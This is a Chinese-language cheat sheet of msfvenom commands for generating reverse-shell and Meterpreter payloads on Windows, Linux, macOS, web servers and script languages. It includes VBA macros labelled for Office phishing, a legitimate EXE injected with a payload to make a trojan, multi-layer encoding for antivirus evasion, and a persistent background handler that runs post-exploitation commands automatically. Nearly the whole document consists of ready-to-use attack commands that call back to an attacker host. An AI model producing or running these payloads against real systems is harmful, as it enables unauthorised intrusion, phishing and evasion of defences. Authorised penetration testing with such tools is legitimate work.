# msfvenom Payload 生成速查

## 命令格式

```bash
# 本地模式
msfvenom -p <payload> LHOST=<你的IP> LPORT=<端口> -f <格式> -o <输出文件>

# Docker 模式（输出到挂载目录，宿主机可取）
docker exec $MSF_CONTAINER msfvenom -p <payload> LHOST=<你的IP> LPORT=<端口> -f <格式> -o /loot/<输出文件>
# 宿主机取文件: /tmp/msf-loot/<输出文件>
```

## Windows Payload

```bash
# x64 Meterpreter EXE（首选）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell64.exe

# x86 Meterpreter EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell32.exe

# Stageless（大文件但一次到位，适合不稳定网络）
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell_stageless.exe

# HTTPS（加密流量，过防火墙）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell_https.exe

# 纯 cmd shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o cmd_shell.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o shell.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh -o shell.ps1

# VBA 宏（Office 钓鱼）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f vba -o macro.vba

# HTA
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f hta-psh -o shell.hta

# MSI 安装包
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o shell.msi

# 注入到已有 EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -x /path/to/legit.exe -f exe -o trojan.exe

# C Shellcode（用于自定义加载器）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f c
```

## Linux Payload

```bash
# x64 Meterpreter ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell

# x64 shell ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell

# Stageless Meterpreter
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell_stageless

# Bash 反弹 shell（最简单）
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=4444 -f raw -o shell.sh

# Python 反弹 shell
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=4444 -f raw -o shell.py

# Netcat 反弹
msfvenom -p cmd/unix/reverse_netcat LHOST=<IP> LPORT=4444 -f raw

# C Shellcode
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f c
```

## macOS Payload

```bash
# Meterpreter Mach-O
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f macho -o shell

# Shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f macho -o shell
```

## Web Payload

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.jsp

# WAR（Tomcat 部署）
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx

# Node.js
msfvenom -p nodejs/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.js
```

## 脚本语言 Payload

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.py

# Ruby
msfvenom -p ruby/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.rb

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=4444 -f raw -o shell.pl
```

## 编码与免杀

```bash
# 自动选择编码器（通过坏字符触发）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00\x0a\x0d' -f exe -o encoded.exe

# 指定编码器 + 迭代次数
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多层编码（管道串联）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o multi_encoded.exe

# 生成最小 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 --smallest -f exe -o tiny.exe
```

注意：编码器不是可靠的免杀方案，现代杀软靠行为检测。

## 监听器设置

**生成 payload 后必须启动 handler 监听**。handler 需长期运行等待目标回连，用后台进程模式：

```bash
# 定义 session 建立后自动执行的后渗透命令（可选）
cat > /tmp/post_auto.rc << 'EOF'
sysinfo
getuid
run post/windows/manage/migrate
EOF

# 启动 handler（后台运行，不会退出）
cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript "multi_console_command -r /tmp/post_auto.rc"
exploit
EOF
nohup msfconsole -q -r /tmp/handler.rc > /tmp/handler.log 2>&1 &
echo "Handler PID: $! — 查看: tail -f /tmp/handler.log"
```

**注意**：`exploit` 不带 `-j` 使 msfconsole 阻塞等待连接不退出。`-x` 模式会在命令执行完后退出 msfconsole，导致 handler 被杀，**不能用 `-x` 启动 handler**。

## 列举可用资源

```bash
msfvenom -l payloads           # 所有 payload
msfvenom -l payloads | grep windows  # 过滤 Windows
msfvenom -l encoders           # 所有编码器
msfvenom -l formats            # 所有输出格式
msfvenom -l platforms          # 所有平台
msfvenom -p <payload> --list-options  # 查看 payload 选项
```
